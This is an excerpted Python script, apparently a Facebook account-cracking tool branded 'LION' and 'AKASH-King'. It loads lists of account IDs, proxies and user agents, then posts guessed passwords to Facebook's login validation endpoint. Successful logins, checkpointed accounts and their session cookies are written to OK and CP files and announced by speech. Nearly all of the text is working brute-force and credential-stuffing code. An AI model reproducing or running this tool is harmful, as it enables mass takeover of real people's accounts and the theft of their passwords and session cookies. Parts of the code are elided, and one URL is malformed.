...
time.sleep(2)
os.system(f'xdg-open https://chat.whatsapp.com/HMbdSe1zbiuDl1FZ4CJsz7')
#------------------[ AKASH-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/afglion5/api/blob/main/prox.txt').text
...
for xd in range(10000):
    ...
    aa='Mozilla/5.0 (Linux; Android 9; SM-A750FN)'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/afglion5/ua5/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
def menu():
    ...
    print('\033[0;97m===============================================')
    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92m𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄         """)
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93m𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑""")
...
def crack_file():
    ...
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] PUT FILE NAME :\033[92;1m ')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[LION•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[LION-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[LION-𝐎𝐊💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " LION,  OK,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[LION-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•LION-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•LION-𝐎𝐊] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  LION,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
